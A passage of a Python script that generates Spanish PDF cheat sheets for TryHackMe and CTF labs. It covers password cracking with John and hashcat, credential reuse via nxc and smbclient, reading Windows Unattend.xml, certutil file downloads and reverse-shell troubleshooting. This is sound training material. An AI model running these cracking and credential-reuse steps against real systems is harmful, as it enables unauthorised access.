                    "type C:\\Windows\\Panther\\Unattend.xml 2>nul",
                ],
            },
            {
                "heading": "4. Conversiones John frecuentes",
                "code": [
                    "zip2john secret.zip > zip.hash",
                    "rar2john secret.rar > rar.hash",
                    "keepass2john vault.kdbx > keepass.hash",
                    "ssh2john id_rsa > id_rsa.hash",
                    "office2john document.docx > office.hash",
                    "pdf2john file.pdf > pdf.hash",
                    "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
                    "john --show hash.txt",
                ],
                "bullets": [
                    "Si John no reconoce un formato, revisa si necesitas herramienta *2john especifica.",
                    "Guarda siempre archivo original y hash convertido.",
                ],
            },
            {
                "heading": "5. Hashcat basico",
                "code": [
                    "hashid hash.txt",
                    "hashcat --example-hashes | grep -i ntlm -n",
                    "hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt",
                    "hashcat -m 3200 bcrypt.hash /usr/share/wordlists/rockyou.txt",
                    "hashcat --show -m 1000 ntlm.hash",
                ],
                "bullets": [
                    "Identifica modo antes de lanzar.",
                    "En THM, rockyou + reglas simples suele bastar para hashes de reto.",
                    "Si es lento, revisa si el hash es realmente crackeable offline o necesitas otro vector.",
                ],
            },
            {
                "heading": "6. Reutilizacion controlada",
                "body": ["Una password puede valer para SSH, SMB, WinRM, panel web, base de datos o sudo."],
                "code": [
                    "ssh user@$IP",
                    "smbclient -L //$IP -U 'user%password'",
                    "nxc smb $IP -u user -p password",
                    "nxc winrm $IP -u user -p password",
                    "mysql -h $IP -u user -p",
                    "sudo -l",
                ],
                "bullets": [
                    "En AD, evita spraying agresivo. Usa usuarios reales y una password candidata con control.",
                    "Registra donde funciono cada credencial y que permisos dio.",
                ],
            },
            {
                "heading": "7. KeePass y archivos cifrados",
                "code": [
                    "keepass2john database.kdbx > keepass.hash",
                    "john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash",
                    "john --show keepass.hash",
                    "kpcli --kdb database.kdbx",
                ],
                "bullets": [
                    "Busca keyfiles junto al .kdbx.",
                    "Si encuentras notas de usuario, usalas para crear wordlist pequena.",
                ],
            },
            {
                "heading": "8. Checklist loot",
                "bullets": [
                    "Crear loot/ y separar hashes/, creds/, files/.",
                    "No mezclar credenciales validas con basura sin etiquetar.",
                    "Registrar fuente: archivo/ruta/comando/usuario.",
                    "Probar reutilizacion por servicio, no a ciegas.",
                    "Volver a enumerar despues de cada credencial nueva.",
                ],
            },
        ],
    },
    {
        "filename": "THM_GUIDE_2026-07-02_room-writeup-template.pdf",
        "title": "Plantilla practica - Notas y Writeup para Rooms THM / CTF",
        "short": "Plantilla de room/writeup",
        "desc": "Estructura para registrar evidencia, comandos, credenciales, decisiones y cadena de ataque reproducible.",
        "sections": [
            {
                "heading": "Objetivo",
                "body": [
                    "Plantilla para no perder hallazgos mientras resuelves. La meta es que tus notas sirvan para continuar, explicar y escribir el writeup final.",
                    "Una buena nota responde: que vi, que probe, que salio, que desbloquea y donde esta la evidencia.",
                ],
            },
            {
                "heading": "1. Estructura de carpeta",
                "code": [
                    "mkdir -p nmap web loot creds hashes screenshots exploits notes",
                    "touch notes/00-index.md notes/creds.md notes/commands.md notes/timeline.md",
                ],
            },
            {
                "heading": "2. Ficha inicial",
                "code": [
                    "# Room",
                    "- Nombre:",
                    "- Plataforma: TryHackMe",
                    "- Fecha:",
                    "- IP:",
                    "- Hostnames:",
                    "- Dominio:",
                    "- Objetivo:",
                    "- VPN/AttackBox:",
                ],
            },
            {
                "heading": "3. Tabla de superficie",
                "table": [
                    ["Puerto", "Servicio", "Version", "Evidencia", "Siguiente prueba"],
                    ["80", "HTTP", "Apache/PHP", "nmap_services.txt + whatweb", "ffuf, Burp, vhosts"],
                    ["445", "SMB", "Windows/AD", "nmap_ad.txt", "shares, users, rid brute"],
                    ["22", "SSH", "OpenSSH", "nmap_services.txt", "probar creds/keys"],
                ],
            },
            {
                "heading": "4. Registro de comandos",
                "code": [
                    "## Comando",
                    "Fecha/hora:",
                    "Contexto:",
                    "Comando:",
                    "Resultado importante:",
                    "Archivo de evidencia:",
                    "Decision desbloqueada:",
                ],
                "bullets": [
                    "No guardes cada linea de ruido; guarda outputs que cambian la decision.",
                    "Si un comando falla, anota error y razon probable.",
                ],
            },
            {
                "heading": "5. Credenciales",
                "code": [
                    "| Usuario | Password/Hash | Fuente | Servicio probado | Resultado |",
                    "| --- | --- | --- | --- | --- |",
                    "| user | pass | /var/www/config.php | ssh/smb/web | ssh OK |",
                ],
                "bullets": [
                    "Separar credenciales confirmadas de candidatas.",
                    "Anotar si una credencial abre nueva enumeracion.",
                ],
            },
            {
                "heading": "6. Cadena de ataque",
                "code": [
                    "1. Recon: puertos abiertos y tecnologia.",
                    "2. Enumeracion: hallazgo clave.",
                    "3. Acceso inicial: vector exacto.",
                    "4. Post-exploit: usuario y permisos.",
                    "5. Privesc: misconfig explotada.",
                    "6. Flags: rutas y evidencia.",
                    "7. Root cause: por que funciono.",
                ],
            },
            {
                "heading": "7. Plantilla de hallazgo",
                "code": [
                    "## Hallazgo",
                    "- Titulo:",
                    "- Impacto:",
                    "- Precondiciones:",
                    "- Evidencia:",
                    "- Pasos reproducibles:",
                    "- Comandos minimos:",
                    "- Resultado:",
                    "- Mitigacion teorica:",
                ],
            },
            {
                "heading": "8. Checklist de cierre",
                "bullets": [
                    "Tengo user.txt/root.txt o los objetivos de la room.",
                    "Puedo reproducir acceso inicial con comandos minimos.",
                    "Puedo explicar la escalada sin depender de output gigante de linpeas/winpeas.",
                    "Credenciales y hashes estan etiquetados por fuente.",
                    "El writeup no contiene secretos personales fuera del lab.",
                    "Anote falsos caminos relevantes para no repetirlos.",
                ],
            },
        ],
    },
    {
        "filename": "THM_GUIDE_2026-07-02_terminal-command-equivalences.pdf",
        "title": "Cheatsheet - Equivalencias de comandos Windows y Linux",
        "short": "Equivalencias Windows/Linux",
        "desc": "Tabla rapida para traducir comandos comunes entre Linux, Windows CMD y PowerShell durante rooms.",
        "sections": [
            {
                "heading": "Objetivo",
                "body": [
                    "Chuleta rapida para no bloquearte al cambiar entre Linux, Windows CMD y PowerShell.",
                    "En Windows moderno, muchas rooms mezclan cmd.exe y PowerShell. Si un comando falla, comprueba en que shell estas.",
                ],
            },
            {
                "heading": "1. Navegacion y archivos",
                "table": [
                    ["Objetivo", "Linux", "Windows CMD", "PowerShell"],
                    ["Listar archivos", "ls -la", "dir", "Get-ChildItem / ls / dir"],
                    ["Cambiar directorio", "cd /ruta", "cd C:\\ruta", "Set-Location C:\\ruta / cd"],
                    ["Ruta actual", "pwd", "cd", "Get-Location / pwd"],
                    ["Ver archivo", "cat file.txt", "type file.txt", "Get-Content file.txt / cat"],
                    ["Ver por paginas", "less file.txt", "more file.txt", "Get-Content file.txt | more"],
                    ["Copiar", "cp a b", "copy a b", "Copy-Item a b"],
                    ["Mover/renombrar", "mv a b", "move a b / ren a b", "Move-Item a b / Rename-Item"],
                    ["Borrar archivo", "rm file", "del file", "Remove-Item file / rm"],
                    ["Borrar carpeta", "rm -r dir", "rmdir /s dir", "Remove-Item dir -Recurse"],
                    ["Crear carpeta", "mkdir dir", "mkdir dir", "New-Item -ItemType Directory dir / mkdir"],
                    ["Crear archivo vacio", "touch file", "type nul > file", "New-Item file -ItemType File"],
                ],
            },
            {
                "heading": "2. Busqueda y texto",
                "table": [
                    ["Objetivo", "Linux", "Windows CMD", "PowerShell"],
                    ["Buscar texto", "grep -R \"pass\" .", "findstr /S /I pass *", "Select-String -Path * -Pattern pass -Recurse"],
                    ["Buscar archivo", "find / -name file 2>/dev/null", "dir /s /b file", "Get-ChildItem -Recurse -Filter file"],
                    ["Primeras lineas", "head file", "powershell -c \"gc file -Head 10\"", "Get-Content file -Head 10"],
                    ["Ultimas lineas", "tail file", "powershell -c \"gc file -Tail 10\"", "Get-Content file -Tail 10"],
                    ["Seguir log", "tail -f log", "powershell -c \"gc log -Wait\"", "Get-Content log -Wait"],
                    ["Contar lineas", "wc -l file", "find /c /v \"\" file", "(Get-Content file).Count"],
                    ["Filtrar salida", "cmd | grep text", "cmd | findstr text", "cmd | Select-String text"],
                ],
            },
            {
                "heading": "3. Sistema, usuarios y procesos",
                "table": [
                    ["Objetivo", "Linux", "Windows CMD", "PowerShell"],
                    ["Usuario actual", "whoami / id", "whoami", "whoami"],
                    ["Grupos/privilegios", "id / groups", "whoami /groups / whoami /priv", "whoami /groups; whoami /priv"],
                    ["Hostname", "hostname", "hostname", "hostname"],
                    ["Info sistema", "uname -a; cat /etc/os-release", "systeminfo", "Get-ComputerInfo"],
                    ["Variables entorno", "env", "set", "Get-ChildItem Env:"],
                    ["Procesos", "ps aux", "tasklist", "Get-Process"],
                    ["Matar proceso", "kill -9 PID", "taskkill /PID PID /F", "Stop-Process -Id PID -Force"],
                    ["Servicios", "systemctl / service", "sc query", "Get-Service"],
                    ["Tareas programadas", "crontab -l / systemctl list-timers", "schtasks /query /fo LIST /v", "Get-ScheduledTask"],
                ],
            },
            {
                "heading": "4. Red y conexiones",
                "table": [
                    ["Objetivo", "Linux", "Windows CMD", "PowerShell"],
                    ["IP/interfaces", "ip a / ifconfig", "ipconfig /all", "Get-NetIPConfiguration"],
                    ["Rutas", "ip route", "route print", "Get-NetRoute"],
                    ["Puertos escuchando", "ss -tulpen / netstat -tulpen", "netstat -ano", "Get-NetTCPConnection"],
                    ["DNS lookup", "dig host / nslookup host", "nslookup host", "Resolve-DnsName host"],
                    ["Conectividad", "ping -c 4 IP", "ping IP", "Test-Connection IP"],
                    ["Probar puerto", "nc -nv IP 80", "telnet IP 80", "Test-NetConnection IP -Port 80"],
                    ["Descargar archivo", "wget URL -O file / curl -o file URL", "certutil -urlcache -split -f URL file", "Invoke-WebRequest URL -OutFile file"],
                    ["Servidor HTTP rapido", "python3 -m http.server 8000", "python -m http.server 8000", "python -m http.server 8000"],
                ],
            },
            {
                "heading": "5. Permisos y hashes utiles",
                "table": [
                    ["Objetivo", "Linux", "Windows CMD", "PowerShell"],
                    ["Permisos archivo", "ls -la file", "icacls file", "Get-Acl file"],
                    ["Cambiar permisos", "chmod +x file", "icacls file /grant user:F", "icacls file /grant user:F"],
                    ["Propietario", "stat file", "dir /q file", "Get-Acl file | Select Owner"],
                    ["Hash MD5/SHA", "md5sum file / sha256sum file", "certutil -hashfile file SHA256", "Get-FileHash file -Algorithm SHA256"],
                    ["Archivos ocultos", "ls -la", "dir /a", "Get-ChildItem -Force"],
                ],
            },
            {
                "heading": "6. Notas rapidas",
                "bullets": [
                    "PowerShell acepta muchos alias tipo ls, cat, cp, mv y rm, pero no siempre se comportan igual que Linux.",
                    "En scripts o writeups, usa comandos nativos claros: Get-ChildItem, Get-Content, Copy-Item, Remove-Item.",
                    "En CMD, los comodines y comillas se comportan distinto a Bash. Si algo raro falla, prueba PowerShell.",
                    "En Windows, rutas con espacios necesitan comillas: \"C:\\Program Files\\App\".",
                    "Para THM, certutil e Invoke-WebRequest son los dos metodos de descarga que mas aparecen.",
                ],
            },
        ],
    },
    {
        "filename": "THM_GUIDE_2026-07-02_common-errors.pdf",
        "title": "Guia practica - Errores tipicos y soluciones THM / CTF",
        "short": "Errores tipicos",
        "desc": "Problemas frecuentes en THM y como desbloquearlos rapido.",
        "sections": [
            {
                "heading": "Objetivo",
                "body": [
                    "Tabla de rescate para distinguir si un bloqueo viene de conectividad, nombres/dominio, autenticacion, herramienta o interpretacion del resultado.",
                ],
            },
            {
                "heading": "1. Errores frecuentes",
                "table": [
                    ["Sintoma", "Causa probable", "Que probar"],
                    ["No responde ping", "ICMP filtrado o VPN rara.", "Usar nmap -Pn; comprobar tun0/VPN; reiniciar target si THM va lento."],
                    ["nmap ve pocos puertos", "Rate alto, host filtrando o escaneo incompleto.", "Repetir con -Pn, bajar --min-rate, probar UDP si aplica."],
                    ["ffuf devuelve todo 200", "Wildcard o pagina catch-all.", "Filtrar con -fs, -fw, -fl; comparar una ruta aleatoria inexistente."],
                    ["vhost no aparece", "Host header incorrecto o falta /etc/hosts.", "Anadir dominio a /etc/hosts; usar -H 'Host: FUZZ.dominio'."],
                    ["Reverse shell no llega", "LHOST mal, VPN IP incorrecta, firewall o puerto ocupado.", "Usar ip a/tun0; nc -lvnp; probar curl desde victima a tu HTTP."],
                    ["Shell se corta", "TTY inestable o comando interactivo.", "Estabilizar con python pty, stty raw -echo, TERM=xterm."],
                    ["smbclient ACCESS_DENIED", "Formato de usuario/dominio o permisos insuficientes.", "Probar -N, Guest, DOMAIN/user, user%pass, smbmap y nxc."],
                    ["Kerberos KRB_AP_ERR_SKEW", "Hora desincronizada.", "Sincronizar hora con DC; comprobar timezone; usar FQDN correcto."],
                    ["Cannot find KDC", "DNS/hosts/realm mal.", "Anadir DC_FQDN y dominio a /etc/hosts; revisar DOMAIN."],
                    ["evil-winrm falla", "Puerto cerrado, formato usuario o cred invalida.", "nxc winrm $IP -u USER -p PASS; probar DOMAIN\\USER; revisar 5985/5986."],
                    ["SQLMap no detecta nada", "Request incompleta, parametro no vulnerable o WAF/filtro.", "Usar -r desde Burp, marcar parametro con *, subir level/risk con cuidado."],
                    ["PoC no funciona", "Version/config no coincide o requiere auth.", "Leer PoC, confirmar precondiciones, reproducir peticion minima con curl/Burp."],
                ],
            },
            {
                "heading": "2. Regla de oro",
                "bullets": [
                    "Si una herramienta falla, reproduce la condicion minima con curl, nc, smbclient o nxc.",
                    "Si un servicio depende de nombre, no insistas solo con IP.",
                    "Si una credencial funciona en un sitio, pruebala de forma controlada en los demas servicios.",
                ],
            },
        ],
    },
    {
        "filename": "THM_GUIDE_2026-07-02_stuck-checklist.pdf",
        "title": "Checklist practica - Me he atascado en una room THM / CTF",
        "short": "Checklist de atasco",
        "desc": "Preguntas para cuando llevas rato sin avanzar.",
        "sections": [
            {
                "heading": "Objetivo",
                "body": [
                    "Lista de rescate para volver a lo basico y encontrar una superficie que no hayas reenumerado con la informacion nueva.",
                ],
            },
            {
                "heading": "1. Preguntas de desbloqueo",
                "table": [
                    ["Pregunta", "Por que puede desbloquear"],
                    ["He revisado UDP?", "DNS, SNMP, TFTP o NFS suelen cambiar completamente la room."],
                    ["He probado vhosts?", "Muchas webs esconden paneles o apps por Host header."],
                    ["He mirado robots, sitemap, JS y codigo fuente?", "Puede filtrar rutas, endpoints, tokens o comentarios."],
                    ["Tengo usuarios reales?", "Usuarios reales permiten spraying, AS-REP, Kerberoast o cred reuse."],
                    ["He reenumerado con nuevas credenciales?", "Una cred valida cambia shares, LDAP, web, sudo, WinRM y DB."],
                    ["Hay servicios solo en localhost?", "Puede requerir pivot o port forward tras conseguir shell."],
                    ["He probado cred reuse?", "La misma password puede abrir SSH, SMB, WinRM, panel web, MySQL o sudo."],
                    ["Estoy usando hostname cuando toca?", "Kerberos, vhosts y apps internas pueden fallar solo por usar IP."],
                    ["He revisado permisos de escritura?", "Privesc suele venir de scripts, servicios, cron/tareas o configs escribibles."],
                    ["Estoy siguiendo un falso positivo?", "Vuelve a evidencia: version exacta, respuesta real e impacto claro."],
                ],
            },
            {
                "heading": "2. Reset de 10 minutos",
                "code": [
                    "cat nmap/services.txt",
                    "grep -RniE 'pass|user|key|token|admin' loot web notes 2>/dev/null",
                    "cat notes/creds.md 2>/dev/null",
                    "cat notes/timeline.md 2>/dev/null",
                ],
                "bullets": [
                    "Escribe en una linea cual es tu mejor hipotesis actual.",
                    "Escribe que evidencia la apoya y que prueba la descartaria.",
                    "Si no puedes responder eso, vuelve a enumeracion, no a exploits.",
                ],
            },
        ],
    },
]


def normalize_text(text):
    replacements = {
        "—": "-",
        "–": "-",
        "“": '"',
        "”": '"',
        "‘": "'",
        "’": "'",
        "→": "->",
    }
    for src, dst in replacements.items():
        text = text.replace(src, dst)
    return text


def make_styles():
    styles = getSampleStyleSheet()
    styles.add(
        ParagraphStyle(
            name="CoverTitle",
            parent=styles["Title"],
            fontName="Helvetica-Bold",
            fontSize=24,
            leading=29,
            alignment=TA_CENTER,
            textColor=colors.HexColor("#111827"),
            spaceAfter=14,
        )
    )
    styles.add(
        ParagraphStyle(
            name="CoverSub",
            parent=styles["Normal"],
            fontSize=10.5,
            leading=14,
            alignment=TA_CENTER,
            textColor=colors.HexColor("#475467"),
            spaceAfter=20,
        )
    )
    styles.add(
        ParagraphStyle(
            name="H1x",
            parent=styles["Heading1"],
            fontName="Helvetica-Bold",
            fontSize=15.5,
            leading=19,
            textColor=colors.HexColor("#111827"),
            spaceBefore=10,
            spaceAfter=6,
        )
    )
    styles.add(
        ParagraphStyle(
            name="Bodyx",
            parent=styles["BodyText"],
            fontSize=9.2,
            leading=12.1,
            textColor=colors.HexColor("#1f2937"),
            spaceAfter=5,
        )
    )
    styles.add(
        ParagraphStyle(
            name="Smallx",
            parent=styles["BodyText"],
            fontSize=8,
            leading=10.2,
            textColor=colors.HexColor("#475467"),
            spaceAfter=3,
        )
    )
    styles.add(
        ParagraphStyle(
            name="Cell",
            parent=styles["BodyText"],
            fontSize=7.4,
            leading=8.9,
            textColor=colors.HexColor("#1f2937"),
        )
    )
    styles.add(
        ParagraphStyle(
            name="HeaderCell",
            parent=styles["BodyText"],
            fontName="Helvetica-Bold",
            fontSize=7.4,
            leading=8.9,
            textColor=colors.white,
        )
    )
    return styles


STYLES = make_styles()


def p(text, style="Bodyx"):
    return Paragraph(normalize_text(text), STYLES[style])


def code_block(lines):
    text = normalize_text("\n".join(lines))
    pre = Preformatted(
        text,
        ParagraphStyle(
            name="Code",
            fontName="Courier",
            fontSize=7.2,
            leading=9,
            textColor=colors.HexColor("#111827"),
            backColor=colors.HexColor("#f5f7fa"),
            borderColor=colors.HexColor("#d0d5dd"),
            borderWidth=0.35,
            borderPadding=5,
            leftIndent=0,
            rightIndent=0,
            spaceBefore=3,
            spaceAfter=7,
        ),
    )
    return pre


def bullets(items):
    return [p("&bull; " + item) for item in items]


def make_table(rows, widths=None):
    if widths is None:
        widths = [4.0 * cm, 12.2 * cm]
    data = []
    for row_index, row in enumerate(rows):
        style = "HeaderCell" if row_index == 0 else "Cell"
        data.append([p(str(cell), style) for cell in row])
    table = Table(data, colWidths=widths, hAlign="LEFT", repeatRows=1)
    table.setStyle(
        TableStyle(
            [
                ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#111827")),
                ("BOX", (0, 0), (-1, -1), 0.35, colors.HexColor("#d0d5dd")),
                ("INNERGRID", (0, 0), (-1, -1), 0.25, colors.HexColor("#eaecf0")),
                ("VALIGN", (0, 0), (-1, -1), "TOP"),
                ("LEFTPADDING", (0, 0), (-1, -1), 5),
                ("RIGHTPADDING", (0, 0), (-1, -1), 5),
                ("TOPPADDING", (0, 0), (-1, -1), 4),
                ("BOTTOMPADDING", (0, 0), (-1, -1), 4),
            ]
        )
    )
    return table


def on_doc_page(canvas, doc):
    canvas.saveState()
    canvas.setFont("Helvetica", 8)
    canvas.setFillColor(colors.HexColor("#667085"))
    canvas.drawString(1.45 * cm, 1.0 * cm, f"{doc.title} - pagina {doc.page}")
    canvas.restoreState()


def build_individual_doc(doc_def):
    path = OUT_DIR / doc_def["filename"]
    story = [
        Spacer(1, 1.0 * cm),
        p(doc_def["title"], "CoverTitle"),
        p("Uso previsto: laboratorios autorizados, TryHackMe y CTF. Ajusta rutas, IPs, credenciales y herramientas segun el entorno.", "CoverSub"),
    ]
    for section in doc_def["sections"]:
        story.append(p(section["heading"], "H1x"))
        for paragraph in section.get("body", []):
            story.append(p(paragraph))
        if "table" in section:
            cols = len(section["table"][0])
            widths = [16.2 * cm / cols] * cols
            story.append(make_table(section["table"], widths))
            story.append(Spacer(1, 0.2 * cm))
        if "code" in section:
            story.append(code_block(section["code"]))
        if "bullets" in section:
            story.extend(bullets(section["bullets"]))
        if "code2" in section:
            story.append(code_block(section["code2"]))
    SimpleDocTemplate(
        str(path),
        pagesize=A4,
        rightMargin=1.45 * cm,
        leftMargin=1.45 * cm,
        topMargin=1.35 * cm,
        bottomMargin=1.55 * cm,
        title=doc_def["short"],
    ).build(story, onFirstPage=on_doc_page, onLaterPages=on_doc_page)
    return path


def source_pdf_by_name(name):
    matches = [p for p in ROOT.glob("*.pdf") if p.name == name]
    if len(matches) != 1:
        raise RuntimeError(f"Expected one source pdf for {name}, got {matches}")
    return matches[0]


def source_pdf_contains(text):
    matches = [p for p in ROOT.glob("*.pdf") if text.lower() in p.name.lower()]
    if len(matches) != 1:
        raise RuntimeError(f"Expected one source pdf containing {text}, got {matches}")
    return matches[0]


def wrap_canvas_text(text, font_name, font_size, max_width, max_lines=None):
    text = normalize_text(str(text))
    words = text.split()
    lines = []
    current = ""
    for word in words:
        candidate = word if not current else f"{current} {word}"
        if stringWidth(candidate, font_name, font_size) <= max_width:
            current = candidate
            continue
        if current:
            lines.append(current)
            current = word
        else:
            lines.append(word)
            current = ""
        if max_lines and len(lines) >= max_lines:
            break
    if current and (not max_lines or len(lines) < max_lines):
        lines.append(current)
    if max_lines and len(lines) > max_lines:
        lines = lines[:max_lines]
    if max_lines and lines and len(words) > 0:
        rendered = " ".join(lines)
        if len(rendered) < len(text) and not lines[-1].endswith("..."):
            while stringWidth(lines[-1] + "...", font_name, font_size) > max_width and len(lines[-1]) > 4:
                lines[-1] = lines[-1][:-1].rstrip()
            lines[-1] += "..."
    return lines


def draw_wrapped(canvas_obj, text, x, y, max_width, font_name="Helvetica", font_size=8, leading=10, max_lines=None):
    lines = wrap_canvas_text(text, font_name, font_size, max_width, max_lines)
    canvas_obj.setFont(font_name, font_size)
    for idx, line in enumerate(lines):
        canvas_obj.drawString(x, y - idx * leading, line)
    return len(lines)


def build_master_frontmatter(front_pdf, all_docs, page_counts):
    width, height = A4
    margin = 1.45 * cm
    left = margin
    right = width - margin
    link_rects = []

    c = canvas.Canvas(str(front_pdf), pagesize=A4)
    c.setTitle("THM Master Playbook")

    # Page 1: clickable index.
    c.setFillColor(colors.HexColor("#111827"))
    c.setFont("Helvetica-Bold", 27)
    c.drawCentredString(width / 2, height - 2.55 * cm, "THM Master Playbook")
    c.setFillColor(colors.HexColor("#475467"))
    c.setFont("Helvetica", 11)
    c.drawCentredString(width / 2, height - 3.25 * cm, "Indice interactivo con enlaces internos a cada seccion")
    c.setFillColor(colors.HexColor("#1f2937"))
    intro = (
        "Uso previsto: rooms de TryHackMe, CTFs y laboratorios autorizados. "
        "Pulsa cualquier fila del indice para saltar al modulo correspondiente."
    )
    draw_wrapped(c, intro, left, height - 4.15 * cm, right - left, "Helvetica", 9.2, 12, 2)

    c.setFillColor(colors.HexColor("#111827"))
    c.setFont("Helvetica-Bold", 17)
    c.drawString(left, height - 5.15 * cm, "Indice")

    front_pages = 2
    start_pages = {}
    running = front_pages
    for path, title, _ in all_docs:
        start_pages[title] = running
        running += page_counts[path.name]

    table_x = left
    table_y = height - 5.65 * cm
    col_widths = [1.0 * cm, 6.8 * cm, 1.55 * cm, 6.0 * cm]
    row_h = 0.88 * cm
    header_h = 0.55 * cm
    total_w = sum(col_widths)
    headers = ["#", "Seccion", "Pagina", "Fuente"]

    c.setFillColor(colors.HexColor("#111827"))
    c.rect(table_x, table_y - header_h, total_w, header_h, fill=1, stroke=0)
    c.setFillColor(colors.white)
    c.setFont("Helvetica-Bold", 7.8)
    x = table_x
    for header, col_w in zip(headers, col_widths):
        c.drawString(x + 5, table_y - 0.36 * cm, header)
        x += col_w

    y = table_y - header_h
    c.setStrokeColor(colors.HexColor("#d0d5dd"))
    c.setLineWidth(0.35)
    c.rect(table_x, table_y - header_h - row_h * len(all_docs), total_w, header_h + row_h * len(all_docs), fill=0, stroke=1)
    for idx, (path, title, desc) in enumerate(all_docs, 1):
        y_next = y - row_h
        c.setStrokeColor(colors.HexColor("#eaecf0"))
        c.line(table_x, y_next, table_x + total_w, y_next)
        x = table_x
        for col_w in col_widths[:-1]:
            x += col_w
            c.line(x, y, x, y_next)

        c.setFillColor(colors.HexColor("#1f2937"))
        c.setFont("Helvetica", 7.8)
        c.drawString(table_x + 5, y - 0.34 * cm, str(idx))
        c.setFont("Helvetica-Bold", 7.8)
        draw_wrapped(c, title, table_x + col_widths[0] + 5, y - 0.30 * cm, col_widths[1] - 10, "Helvetica-Bold", 7.8, 8.5, 1)
        c.setFillColor(colors.HexColor("#475467"))
        draw_wrapped(c, desc, table_x + col_widths[0] + 5, y - 0.58 * cm, col_widths[1] - 10, "Helvetica", 6.8, 7.5, 2)
        c.setFillColor(colors.HexColor("#1f2937"))
        c.setFont("Helvetica", 7.8)
        c.drawString(table_x + col_widths[0] + col_widths[1] + 5, y - 0.34 * cm, str(start_pages[title] + 1))
        draw_wrapped(c, path.name, table_x + col_widths[0] + col_widths[1] + col_widths[2] + 5, y - 0.30 * cm, col_widths[3] - 10, "Helvetica", 6.9, 8, 3)

        link_rects.append(
            {
                "front_page": 0,
                "target_title": title,
                "rect": (table_x, y_next, table_x + total_w, y),
            }
        )
        y = y_next

    c.setFillColor(colors.HexColor("#667085"))
    c.setFont("Helvetica", 8)
    c.drawString(left, 1.0 * cm, "THM Master Playbook - indice interactivo - pagina 1")
    c.showPage()

    # Page 2: clickable decision map.
    c.setFillColor(colors.HexColor("#111827"))
    c.setFont("Helvetica-Bold", 22)
    c.drawString(left, height - 2.5 * cm, "Mapa de uso rapido")
    c.setFillColor(colors.HexColor("#475467"))
    c.setFont("Helvetica", 9.5)
    c.drawString(left, height - 3.0 * cm, "Pulsa una fila para saltar al modulo recomendado.")

    map_entries = [
        ("No sabes por donde empezar", "Ultra quick start"),
        ("No sabes que tipo de room parece", "Arquetipos de rooms"),
        ("Shell en Windows sin ruta clara a admin", "Windows local privilege escalation"),
        ("Servicio interno no accesible desde Kali", "Pivoting y tunneling"),
        ("API, JWT, GraphQL, SSRF, upload o auth rara", "Web moderna y APIs"),
        ("Dominio Windows/AD", "Windows Active Directory"),
        ("Shell Linux y necesitas root", "Linux privilege escalation"),
        ("Version vulnerable o exploit publico dudoso", "Metodologia CVE/exploit"),
        ("Hash, backup, KeePass, config o credencial candidata", "Credenciales, cracking y loot"),
        ("Te pierdes entre hallazgos o quieres writeup limpio", "Plantilla de room/writeup"),
        ("Comando de Windows y no sabes el equivalente Linux", "Equivalencias Windows/Linux"),
        ("Una herramienta falla con un error raro", "Errores tipicos"),
        ("Llevas rato sin avanzar", "Checklist de atasco"),
        ("SQLi o parametros sospechosos", "SQL Injection y SQLMap"),
        ("WordPress detectado", "WordPress red teaming / CTF"),
        ("Quieres la chuleta general completa", "Base general THM / CTF"),
    ]
    table_y = height - 3.65 * cm
    col_widths = [7.9 * cm, 7.9 * cm]
    row_h = 0.82 * cm
    header_h = 0.55 * cm
    total_w = sum(col_widths)
    c.setFillColor(colors.HexColor("#111827"))
    c.rect(left, table_y - header_h, total_w, header_h, fill=1, stroke=0)
    c.setFillColor(colors.white)
    c.setFont("Helvetica-Bold", 8)
    c.drawString(left + 5, table_y - 0.36 * cm, "Si ves...")
    c.drawString(left + col_widths[0] + 5, table_y - 0.36 * cm, "Salta a...")

    y = table_y - header_h
    c.setStrokeColor(colors.HexColor("#d0d5dd"))
    c.rect(left, table_y - header_h - row_h * len(map_entries), total_w, header_h + row_h * len(map_entries), fill=0, stroke=1)
    for signal, target in map_entries:
        y_next = y - row_h
        c.setStrokeColor(colors.HexColor("#eaecf0"))
        c.line(left, y_next, left + total_w, y_next)
        c.line(left + col_widths[0], y, left + col_widths[0], y_next)
        c.setFillColor(colors.HexColor("#1f2937"))
        draw_wrapped(c, signal, left + 5, y - 0.31 * cm, col_widths[0] - 10, "Helvetica", 8, 8.7, 2)
        c.setFillColor(colors.HexColor("#111827"))
        draw_wrapped(c, target, left + col_widths[0] + 5, y - 0.31 * cm, col_widths[1] - 10, "Helvetica-Bold", 8, 8.7, 2)
        link_rects.append({"front_page": 1, "target_title": target, "rect": (left, y_next, left + total_w, y)})
        y = y_next

    c.setFillColor(colors.HexColor("#111827"))
    c.setFont("Helvetica-Bold", 17)
    c.drawString(left, y - 0.8 * cm, "Notas")
    c.setFillColor(colors.HexColor("#1f2937"))
    notes = [
        "El visor de PDF tambien deberia mostrar marcadores laterales.",
        "Las paginas indicadas son paginas del PDF final, no paginas internas de cada anexo.",
        "Los enlaces se aplican sobre la fila completa para que sea facil pulsarlos.",
    ]
    ny = y - 1.25 * cm
    for note in notes:
        c.setFont("Helvetica", 9)
        c.drawString(left, ny, f"- {note}")
        ny -= 0.42 * cm

    c.setFillColor(colors.HexColor("#667085"))
    c.setFont("Helvetica", 8)
    c.drawString(left, 1.0 * cm, "THM Master Playbook - mapa de uso - pagina 2")
    c.save()
    return link_rects, start_pages


def build_master(generated_paths):
    original_docs = [
        (source_pdf_by_name("Try Hack Me Ctf Cheatsheet.pdf"), "Base general THM / CTF", "Mapa general, servicios, web, shells, cracking, privesc minima y workflow."),
        (source_pdf_by_name("THM_GUIDE_2026-06-30_active-directory-workflow.pdf"), "Windows Active Directory", "Workflow AD con SMB/RID, credenciales, Kerberos, BloodHound y movimiento."),
        (source_pdf_by_name("THM_GUIDE_2026-07-01_linux-privilege-escalation.pdf"), "Linux privilege escalation", "Enumeracion post-shell, sudo, SUID/SGID, capabilities, cron, systemd, contenedores y automatizacion."),
        (source_pdf_contains("Sql Injection Avanzada"), "SQL Injection y SQLMap", "Payloads manuales, UNION/blind/time-based, SQLMap avanzado y mitigacion."),
        (source_pdf_by_name("Cheatsheet Word Press Red Teaming Ctf.pdf"), "WordPress red teaming / CTF", "Fingerprinting WP, WPScan, plugins/temas, XML-RPC, fuzzing, post-auth y shells."),
    ]
    generated_docs = [
        (path, doc["short"], doc["desc"]) for path, doc in zip(generated_paths, GENERATED_DOCS)
    ]
    all_docs = original_docs[:1] + generated_docs[:5] + original_docs[1:3] + generated_docs[5:] + original_docs[3:]

